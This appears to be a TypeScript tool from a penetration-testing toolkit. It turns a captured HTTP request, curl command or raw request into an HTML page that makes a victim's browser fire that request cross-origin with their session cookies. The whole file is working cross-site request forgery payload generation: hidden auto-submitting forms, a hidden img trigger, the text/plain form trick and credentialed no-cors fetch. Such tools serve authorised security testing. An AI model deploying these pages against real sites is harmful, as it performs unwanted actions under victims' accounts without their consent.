#!/usr/bin/env bun
/**
 * csrf-poc.ts — Burp's "Engagement Tools → CSRF PoC Generator" equivalent.
 *
 * Given a captured request (proxy flow id, raw HTTP, or curl command),
 * emit a self-contained HTML page that, when opened in a victim browser,
 * fires the same request cross-origin. Useful to demonstrate exploitable
 * state-changing endpoints that lack CSRF tokens or rely solely on the
 * cookie origin.
 *
 * Modes:
 *   from-flow <id>      pull a request from the proxy history DB
 *   from-curl           parse a curl command on stdin
 *   from-raw            parse an HTTP request blob on stdin
 *   from-args           pass --url --method --header --body explicitly
 *
 * Output forms (auto-picked from Content-Type, override with --form):
 *   - application/x-www-form-urlencoded → <form> with hidden inputs
 *   - multipart/form-data               → <form enctype="multipart/...">
 *   - application/json                  → fetch() with credentials:include
 *   - text/plain                        → <form enctype="text/plain"> trick
 *   - other                             → fetch() fallback
 *
 * Flags:
 *   --auto-submit          fire the form on body load (default: button)
 *   --include-cookies      add note that the victim's cookies are sent
 *   --html OUT.html        write to file instead of stdout
 *   --json                 structured output
 */
import { argv } from "node:process"
import { join } from "node:path"
import { homedir } from "node:os"
import { readFileSync, writeFileSync, existsSync } from "node:fs"
import { Database } from "bun:sqlite"
import { makeArgs, bail, ok, readStdin } from "./_lib/common.ts"

const DATA_DIR = join(
  process.env.XDG_DATA_HOME ?? join(homedir(), ".local", "share"),
  "crimecode",
  "proxy",
)
const DB_PATH = join(DATA_DIR, "history.db")

interface Req {
  url: string
  method: string
  headers: Record<string, string>
  body: string
}

const cli = makeArgs(argv)
const cmd = cli.args[0]
if (!cmd || ["--help", "-h"].includes(cmd)) usage(0)

const json = cli.has("--json")
const autoSubmit = cli.has("--auto-submit")
const includeCookies = cli.has("--include-cookies")
const formOverride = cli.flag("form") // urlencoded | multipart | json | plain

let req: Req
if (cmd === "from-flow") req = await fromFlow()
else if (cmd === "from-curl") req = parseCurl(await readStdin())
else if (cmd === "from-raw") req = parseRawHttp(await readStdin())
else if (cmd === "from-args") req = fromArgs()
else usage(2)

const poc = buildPoc(req, formOverride, autoSubmit, includeCookies)

const out = cli.flag("html")
if (out) {
  writeFileSync(out, poc.html)
  ok(`wrote ${out} (${poc.method.toUpperCase()})`)
}
if (json) {
  console.log(JSON.stringify({ ...poc, html: out ? "<written to " + out + ">" : poc.html }, null, 2))
} else if (!out) {
  console.log(poc.html)
}

// ---------------------------------------------------------------------------
// Builders
// ---------------------------------------------------------------------------

function buildPoc(
  r: Req,
  overrideForm: string | null,
  auto: boolean,
  cookies: boolean,
): { method: string; html: string; reasoning: string } {
  const ct = (r.headers["content-type"] ?? r.headers["Content-Type"] ?? "").toLowerCase()
  let method: string
  let reasoning: string

  if (overrideForm) {
    method = overrideForm
    reasoning = `forced via --form ${overrideForm}`
  } else if (r.method.toUpperCase() === "GET") {
    method = "img"
    reasoning = "GET request: an <img> tag is the simplest cross-origin trigger"
  } else if (ct.includes("application/x-www-form-urlencoded")) {
    method = "urlencoded"
    reasoning = "Content-Type is form-urlencoded: standard <form>"
  } else if (ct.includes("multipart/form-data")) {
    method = "multipart"
    reasoning = "Content-Type is multipart/form-data: <form enctype>"
  } else if (ct.includes("application/json")) {
    method = "json"
    reasoning = "Content-Type is JSON: forms cannot send it raw, so we use fetch() (requires permissive CORS / no preflight)"
  } else if (ct.startsWith("text/")) {
    method = "plain"
    reasoning = "Content-Type is text/plain: use the form text/plain trick"
  } else {
    method = "fetch"
    reasoning = `unknown Content-Type "${ct}": fall back to fetch()`
  }

  let html: string
  if (method === "img") html = imgPoc(r)
  else if (method === "urlencoded") html = urlencodedPoc(r, auto)
  else if (method === "multipart") html = multipartPoc(r, auto)
  else if (method === "json") html = fetchPoc(r, "application/json")
  else if (method === "plain") html = plainPoc(r, auto)
  else html = fetchPoc(r, ct || "text/plain")

  if (cookies) {
    html =
      `<!--\n` +
      `  CSRF Proof-of-Concept\n` +
      `  Method: ${method}\n` +
      `  Notes : The victim's session cookies are sent automatically when this\n` +
      `          page is opened on a different origin than the target. If the\n` +
      `          server doesn't validate the Origin/Referer or use a CSRF\n` +
      `          token, the request succeeds with the victim's privileges.\n` +
      `-->\n` +
      html
  }

  return { method, html, reasoning }
}

function htmlEscape(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;")
}

function urlencodedPoc(r: Req, auto: boolean): string {
  const params = new URLSearchParams(r.body)
  const inputs = [...params.entries()]
    .map(([k, v]) => `      <input type="hidden" name="${htmlEscape(k)}" value="${htmlEscape(v)}">`)
    .join("\n")
  return `<!doctype html><html><body>
  <h1>CSRF PoC — ${r.method} ${htmlEscape(r.url)}</h1>
  <form id="csrf" action="${htmlEscape(r.url)}" method="${r.method.toUpperCase()}">
${inputs}
    <button type="submit">Submit (CSRF)</button>
  </form>
${auto ? "  <script>document.getElementById('csrf').submit()</script>" : ""}
</body></html>
`
}

function multipartPoc(r: Req, auto: boolean): string {
  // Crude: extract field names from a multipart body
  const boundaryMatch = /boundary=([^;\s]+)/i.exec(r.headers["content-type"] ?? r.headers["Content-Type"] ?? "")
  const boundary = boundaryMatch ? boundaryMatch[1] : null
  const fields: { name: string; value: string }[] = []
  if (boundary) {
    const parts = r.body.split(`--${boundary}`)
    for (const part of parts) {
      const m = /Content-Disposition:\s*form-data;\s*name="([^"]+)"/i.exec(part)
      if (!m) continue
      const idx = part.indexOf("\r\n\r\n")
      const value = idx >= 0 ? part.slice(idx + 4).replace(/\r\n--?$/, "").replace(/\r\n$/, "") : ""
      fields.push({ name: m[1], value })
    }
  }
  const inputs = fields
    .map((f) => `      <input type="hidden" name="${htmlEscape(f.name)}" value="${htmlEscape(f.value)}">`)
    .join("\n")
  return `<!doctype html><html><body>
  <h1>CSRF PoC (multipart) — ${r.method} ${htmlEscape(r.url)}</h1>
  <form id="csrf" action="${htmlEscape(r.url)}" method="${r.method.toUpperCase()}" enctype="multipart/form-data">
${inputs}
    <button type="submit">Submit (CSRF)</button>
  </form>
${auto ? "  <script>document.getElementById('csrf').submit()</script>" : ""}
</body></html>
`
}

function plainPoc(r: Req, auto: boolean): string {
  // text/plain trick — the form encodes name=value with newlines.
  // We can use a single hidden input where the entire body is the name,
  // value is empty, and the resulting on-the-wire body becomes "<body>=".
  const value = r.body.endsWith("=") ? r.body.slice(0, -1) : r.body
  return `<!doctype html><html><body>
  <h1>CSRF PoC (text/plain) — ${r.method} ${htmlEscape(r.url)}</h1>
  <form id="csrf" action="${htmlEscape(r.url)}" method="${r.method.toUpperCase()}" enctype="text/plain">
    <input type="hidden" name="${htmlEscape(value)}" value="">
    <button type="submit">Submit (CSRF)</button>
  </form>
${auto ? "  <script>document.getElementById('csrf').submit()</script>" : ""}
</body></html>
`
}

function imgPoc(r: Req): string {
  return `<!doctype html><html><body>
  <h1>CSRF PoC (GET) — ${htmlEscape(r.url)}</h1>
  <img src="${htmlEscape(r.url)}" alt="csrf-trigger" style="display:none">
  <p>The browser fires the request with the victim's cookies as soon as this page loads.</p>
</body></html>
`
}

function fetchPoc(r: Req, ct: string): string {
  // fetch() bypass — only works if the target permits CORS or the response
  // body isn't read (we don't care about the response, only the side effect).
  const headerLines = Object.entries(r.headers)
    .filter(([k]) => !["host", "content-length", "connection"].includes(k.toLowerCase()))
    .map(([k, v]) => `        ${JSON.stringify(k)}: ${JSON.stringify(v)},`)
    .join("\n")
  return `<!doctype html><html><body>
  <h1>CSRF PoC (fetch) — ${r.method} ${htmlEscape(r.url)}</h1>
  <button onclick="trigger()">Fire request</button>
  <pre id="out"></pre>
  <script>
  async function trigger(){
    try {
      const res = await fetch(${JSON.stringify(r.url)}, {
        method: ${JSON.stringify(r.method.toUpperCase())},
        credentials: "include",
        mode: "no-cors",
        headers: {
${headerLines}
        },
        body: ${JSON.stringify(r.body)}
      });
      document.getElementById("out").textContent = "Sent. Opaque response: " + res.type + " status=" + res.status;
    } catch (e) {
      document.getElementById("out").textContent = "Error: " + e.message;
    }
  }
  </script>
</body></html>
`
}

// ---------------------------------------------------------------------------
// Sources
// ---------------------------------------------------------------------------

async function fromFlow(): Promise<Req> {
  const id = Number(cli.args[1])
  if (!Number.isFinite(id)) bail("usage: from-flow <id>")
  if (!existsSync(DB_PATH)) bail(`no proxy DB at ${DB_PATH}`)
  const db = new Database(DB_PATH, { readonly: true })
  const row = db.query("SELECT * FROM flows WHERE id = ?").get(id) as
    | { method: string; scheme: string; host: string; path: string; req_headers: string; req_body: Buffer | null }
    | undefined
  if (!row) bail(`no flow with id ${id}`)
  const headers = JSON.parse(row.req_headers) as Record<string, string>
  return {
    url: `${row.scheme}://${row.host}${row.path}`,
    method: row.method,
    headers,
    body: row.req_body ? row.req_body.toString("utf8") : "",
  }
}

function fromArgs(): Req {
  const url = cli.required("url")
  const method = (cli.flag("method") ?? "POST").toUpperCase()
  const body = cli.flag("body") ?? ""
  return { url, method, headers: cli.headers(), body }
}

function parseCurl(text: string): Req {
  const tokens = tokenize(text.replace(/\\\s*\n/g, " "))
  let i = 0
  if (tokens[0] === "curl") i++
  const headers: Record<string, string> = {}
  let url = ""
  let method = "GET"
  let body = ""
  while (i < tokens.length) {
    const t = tokens[i]
    if (t === "-X" || t === "--request") method = (tokens[++i] ?? "GET").toUpperCase()
    else if (t === "-H" || t === "--header") {
      const v = tokens[++i] ?? ""
      const idx = v.indexOf(":")
      if (idx > 0) headers[v.slice(0, idx).trim()] = v.slice(idx + 1).trim()
    } else if (t === "-d" || t === "--data" || t === "--data-raw" || t === "--data-binary" || t === "--data-urlencode") {
      body = tokens[++i] ?? ""
      if (method === "GET") method = "POST"
    } else if (t === "-b" || t === "--cookie") headers["Cookie"] = tokens[++i] ?? ""
    else if (t === "--url") url = tokens[++i] ?? ""
    else if (!t.startsWith("-") && !url) url = t
    else if (t.startsWith("--") && tokens[i + 1] && !tokens[i + 1].startsWith("-")) i++
    i++
  }
  if (!url) bail("could not parse URL from curl")
  return { url, method, headers, body }
}

function parseRawHttp(text: string): Req {
  const lines = text.split(/\r?\n/)
  const reqLine = lines.shift() ?? ""
  const m = /^(\w+)\s+(\S+)\s+HTTP\/[\d.]+/.exec(reqLine)
  if (!m) bail("first line is not 'METHOD PATH HTTP/x.y'")
  const method = m[1]
  let path = m[2]
  const headers: Record<string, string> = {}
  while (lines.length) {
    const l = lines.shift() ?? ""
    if (l === "") break
    const idx = l.indexOf(":")
    if (idx > 0) headers[l.slice(0, idx).trim()] = l.slice(idx + 1).trim()
  }
  const body = lines.join("\n")
  const host = headers["Host"] ?? headers["host"] ?? "example.invalid"
  const url = path.startsWith("http") ? path : `https://${host}${path}`
  return { url, method, headers, body }
}

function tokenize(s: string): string[] {
  const out: string[] = []
  let cur = ""
  let mode: "ws" | "raw" | "single" | "double" = "ws"
  for (let i = 0; i < s.length; i++) {
    const ch = s[i]
    if (mode === "ws") {
      if (/\s/.test(ch)) continue
      if (ch === "'") {
        mode = "single"
        cur = ""
      } else if (ch === '"') {
        mode = "double"
        cur = ""
      } else {
        mode = "raw"
        cur = ch
      }
      continue
    }
    if (mode === "raw") {
      if (/\s/.test(ch)) {
        out.push(cur)
        cur = ""
        mode = "ws"
      } else cur += ch
      continue
    }
    if (mode === "single") {
      if (ch === "'") {
        out.push(cur)
        cur = ""
        mode = "ws"
      } else cur += ch
      continue
    }
    if (mode === "double") {
      if (ch === "\\" && i + 1 < s.length) {
        cur += s[++i]
        continue
      }
      if (ch === '"') {
        out.push(cur)
        cur = ""
        mode = "ws"
      } else cur += ch
      continue
    }
  }
  if (mode !== "ws" && cur) out.push(cur)
  return out
}

// ---------------------------------------------------------------------------

function usage(code: number): never {
  console.error(`csrf-poc.ts <command> [flags]

Generate an HTML CSRF Proof-of-Concept page for a given request.

Commands:
  from-flow <id>             read a captured proxy flow
  from-curl                  parse a curl command on stdin
  from-raw                   parse a raw HTTP request on stdin
  from-args                  --url --method --header H:V --body B

Common flags:
  --auto-submit              fire the form on load (default: button)
  --include-cookies          add explanatory comment about session cookies
  --form FORM                force urlencoded|multipart|json|plain|fetch
  --html OUT.html            write PoC to file instead of stdout
  --json                     structured output (no HTML)
`)
  process.exit(code)
}
